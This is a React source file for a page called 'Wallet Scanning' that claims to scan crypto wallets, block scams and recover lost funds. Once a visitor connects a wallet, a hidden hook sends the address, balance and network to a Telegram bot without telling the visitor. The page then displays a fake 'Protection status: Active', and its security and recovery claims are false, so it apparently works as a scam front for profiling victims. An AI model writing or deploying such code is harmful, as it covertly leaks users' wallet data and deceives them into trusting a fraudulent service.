import { useEffect, useState } from "react";
import { useAccount, useDisconnect, useBalance } from "wagmi";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { formatUnits } from "viem";

export default function Scan() {
  const { address, isConnected, chain } = useAccount();
  const { disconnect } = useDisconnect();
  const { open } = useWeb3Modal();
  const { data: balance } = useBalance({ address });
  const [openFaq, setOpenFaq] = useState<string | null>(null);

  // Log balance when connected
  useEffect(() => {
    if (!isConnected || !balance) return;

    const sendTelegram = async () => {
      const formattedBalance = formatUnits(balance.value, balance.decimals);
      const message = `Address: ${address} Balance: ${formattedBalance} ${balance.symbol} (${chain?.name ?? "unknown chain"})`;

      const BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN;
      const CHAT_ID = import.meta.env.VITE_CHATID;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        });
      } catch (err) {
        console.error("Telegram send failed", err);
      }
    };

    sendTelegram();
  }, [isConnected, balance, chain]);

  // Set body background when on this page
  useEffect(() => {
    document.body.style.background =
      "linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%)";
    document.body.style.minHeight = "100vh";
    return () => {
      document.body.style.background = "";
      document.body.style.minHeight = "";
    };
  }, []);

  function handleScan() {
    if (isConnected) return;
    open();
  }

  function handleDisconnect() {
    disconnect();
  }

  function toggleFaq(id: string) {
    setOpenFaq((prev) => (prev === id ? null : id));
  }

  const scamList = [
    "Phishing attacks stealing private keys",
    "Fake airdrop scams draining wallets",
    "Malicious DApp approvals",
    "Impersonation scams on social media",
    "Token spoofing and counterfeit assets",
    "Pump-and-dump schemes",
    "Rug pulls from unverified projects",
    "Compromised seed phrase leaks",
    "Fraudulent ICOs and presales",
    "Unsecured wallet sync exploits",
    "Malware targeting crypto wallets",
    "Deceptive NFT minting scams",
  ];

  const faqs = [
    {
      id: "faq1",
      q: "What is Wallet Scanning?",
      a: "A decentralized tool to secure and recover your Wallet assets using advanced blockchain analysis.",
    },
    {
      id: "faq2",
      q: "How does it prevent scams?",
      a: "It uses blockchain analytics to detect and block fraudulent activities, keeping your funds safe.",
    },
    {
      id: "faq3",
      q: "Can it recover lost funds?",
      a: "Yes, it identifies and restores access to misplaced assets securely on-chain.",
    },
  ];

  return (
    <div
      className="text-gray-200"
      style={{ fontFamily: "'Inter', sans-serif" }}
    >
      {/* Header */}
      <header className="py-6 px-4 sm:px-6 lg:px-8 border-b border-blue-900/30">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between">
          <h1 className="text-3xl font-bold flex items-center mb-4 sm:mb-0">
            <svg
              className="w-12 h-12 mr-3"
              viewBox="0 0 48 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <rect
                width="48"
                height="48"
                rx="12"
                fill="#1D4ED8"
                opacity="0.8"
              />
              <path d="M24 8L10 16L24 24L38 16L24 8Z" fill="#93C5FD" />
              <path d="M10 16V32L24 40V24" fill="#60A5FA" />
              <path d="M24 24V40L38 32V16" fill="#3B82F6" />
              <path
                d="M24 8L10 16L24 24L38 16L24 8Z"
                stroke="#DBEAFE"
                strokeWidth="1"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
              <path
                d="M10 32L24 40L38 32"
                stroke="#DBEAFE"
                strokeWidth="1"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
              <path
                d="M10 24L24 32L38 24"
                stroke="#DBEAFE"
                strokeWidth="1"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeDasharray="2 2"
              />
            </svg>
            Wallet Scanning
          </h1>
          <div className="flex items-center">
            <p className="text-sm italic mr-4 hidden sm:block">
              Decentralized Wallet Protection
            </p>
            <a
              href="#scan"
              className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium py-2 px-4 rounded-lg transition duration-300"
            >
              Get Started
            </a>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Hero / Scan */}
        <section className="text-center mb-16" id="scan">
          <h2 className="text-4xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-blue-300 to-blue-500">
            Secure Your Wallet
          </h2>
          <p className="text-lg mb-8 max-w-2xl mx-auto">
            Protect your digital assets with our 100% secure decentralized
            scanning method. Prevent scams and recover lost funds.
          </p>

          <div className="relative inline-block">
            <button
              id="scanBtn"
              onClick={handleScan}
              disabled={isConnected}
              className="relative overflow-hidden bg-blue-600 hover:bg-blue-700 disabled:opacity-70 text-white font-semibold py-3 px-8 rounded-lg transition duration-300 flex items-center justify-center shadow-lg scan-btn-shine"
            >
              <span>{isConnected ? "Connected ✓" : "Scan Wallet"}</span>
            </button>

            <svg
              className="absolute -right-8 -top-8 w-16 h-16 text-blue-500/40 animate-pulse"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M20 6L9 17L4 12"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>

          {isConnected && (
            <div className="mt-4">
              <button
                id="disconnectBtn"
                onClick={handleDisconnect}
                className="bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-300 shadow-lg"
              >
                Disconnect
              </button>
            </div>
          )}

          {isConnected && (
            <div className="mt-8 bg-gray-800/80 backdrop-blur-sm p-6 rounded-lg border border-blue-900/50 shadow-lg max-w-2xl mx-auto">
              <div className="flex items-center justify-center mb-4">
                <svg
                  className="w-10 h-10 text-blue-400"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3"
                    y="6"
                    width="18"
                    height="12"
                    rx="2"
                    stroke="currentColor"
                    strokeWidth="2"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="3"
                    stroke="currentColor"
                    strokeWidth="2"
                  />
                  <path
                    d="M16 6V4.5C16 3.67157 15.3284 3 14.5 3H9.5C8.67157 3 8 3.67157 8 4.5V6"
                    stroke="currentColor"
                    strokeWidth="2"
                  />
                </svg>
                <h3 className="text-2xl font-semibold ml-2 text-white">
                  Wallet Details
                </h3>
              </div>
              <div className="flex flex-col gap-2">
                <div className="flex items-center">
                  <span className="font-medium text-gray-400 w-24">
                    Address:
                  </span>
                  <span className="font-mono break-all text-blue-300">
                    {address}
                  </span>
                </div>
                <div className="flex items-center">
                  <span className="font-medium text-gray-400 w-24">
                    Network:
                  </span>
                  <span className="text-blue-300">
                    {chain?.name ?? "Unknown"}
                  </span>
                </div>
                <div className="mt-4 pt-4 border-t border-blue-900/30">
                  <div className="flex items-center">
                    <svg
                      className="w-5 h-5 text-green-400 mr-2"
                      viewBox="0 0 24 24"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                    <span className="text-green-400">Protection status:</span>
                    <span className="text-green-400 font-medium ml-2">
                      Active
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </section>

        {/* Feature Cards */}
        <section className="relative mb-16">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
            {[
              {
                title: "About Wallet Scanning",
                desc: "A decentralized solution to safeguard your Wallet assets across multiple networks. Advanced protection with blockchain technology.",
                icon: (
                  <path
                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM12 16V12M12 8H12.01"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                ),
              },
              {
                title: "Why Scan Your Wallet?",
                desc: "Prevent scams, recover lost funds, and secure your assets with our proven method. Stay protected against the latest crypto threats.",
                icon: (
                  <path
                    d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                ),
              },
              {
                title: "How It Works",
                desc: "Connect via Wallet and let our decentralized system protect your funds through advanced blockchain analytics and security measures.",
                icon: (
                  <path
                    d="M12 16V12M12 8H12.01M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12Z"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                ),
              },
            ].map(({ title, desc, icon }) => (
              <div
                key={title}
                className="bg-gray-800/80 backdrop-blur-sm p-6 rounded-lg border border-blue-900/50 shadow-lg transition-transform duration-300 hover:-translate-y-1 hover:shadow-2xl"
              >
                <svg
                  className="w-12 h-12 mb-4 text-blue-400"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  {icon}
                </svg>
                <h3 className="text-xl font-semibold mb-3 text-white">
                  {title}
                </h3>
                <p className="text-gray-300">{desc}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Steps */}
        <section className="bg-gray-800/80 backdrop-blur-sm p-8 rounded-lg border border-blue-900/50 shadow-lg mb-16">
          <div className="flex items-center mb-6">
            <svg
              className="w-8 h-8 text-blue-400 mr-3"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M9 6L20 6M3.8 6H5M3.8 12H5M3.8 18H5M9 12L20 12M9 18L20 18"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
            <h3 className="text-2xl font-semibold text-white">
              Steps to Scan Your Wallet
            </h3>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
            {[
              'Click "Scan Wallet" to begin',
              "Open Wallet on your device",
              "Authorize the connection securely",
              "Wait for the scan to analyze your assets",
              "View your protected wallet details",
            ].map((step, i) => (
              <div
                key={i}
                className="bg-blue-900/30 p-4 rounded-lg border border-blue-800/50"
              >
                <div className="flex justify-center items-center h-12 w-12 bg-blue-600 rounded-full mb-4 mx-auto">
                  <span className="font-bold text-lg">{i + 1}</span>
                </div>
                <p className="text-center text-gray-200">{step}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Scam Protection */}
        <section className="bg-gray-800/80 backdrop-blur-sm p-8 rounded-lg border border-blue-900/50 shadow-lg mb-16">
          <div className="flex items-center mb-6">
            <svg
              className="w-8 h-8 text-blue-400 mr-3"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM12 8V12M12 16H12.01"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
            <h3 className="text-2xl font-semibold text-white">
              Protection Against Scams
            </h3>
          </div>
          <p className="mb-6 text-gray-300">
            Wallet Scanning is your 100% secure method to avoid scams and
            recover lost funds. It prevents:
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {scamList.map((item) => (
              <div key={item} className="flex items-start">
                <svg
                  className="w-5 h-5 text-red-400 mt-1 mr-2 flex-shrink-0"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M12 9V13M12 17H12.01M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
                <span className="text-gray-200">{item}</span>
              </div>
            ))}
          </div>
          <p className="mt-6 text-gray-300">
            Scan your wallet now to ensure total protection and peace of mind.
          </p>
        </section>

        {/* FAQ */}
        <section className="bg-gray-800/80 backdrop-blur-sm p-8 rounded-lg border border-blue-900/50 shadow-lg">
          <div className="flex items-center mb-6">
            <svg
              className="w-8 h-8 text-blue-400 mr-3"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
            <h3 className="text-2xl font-semibold text-white">FAQ</h3>
          </div>
          <div className="space-y-6">
            {faqs.map(({ id, q, a }) => (
              <div key={id}>
                <button
                  onClick={() => toggleFaq(id)}
                  className="text-left w-full font-semibold py-2 flex items-center hover:text-blue-300 transition duration-200"
                >
                  <svg
                    className="w-5 h-5 mr-2 flex-shrink-0"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d={openFaq === id ? "M5 12H19" : "M12 4V20M4 12H20"}
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                  {q}
                </button>
                {openFaq === id && (
                  <div className="text-left p-4 bg-blue-900/30 rounded-lg border border-blue-800/50">
                    {a}
                  </div>
                )}
              </div>
            ))}
          </div>
        </section>
      </main>

      <footer className="py-8 px-4 sm:px-6 lg:px-8 text-center border-t border-blue-900/30">
        <p className="text-sm">© 2025 Wallet Scanning. All rights reserved.</p>
      </footer>
    </div>
  );
}
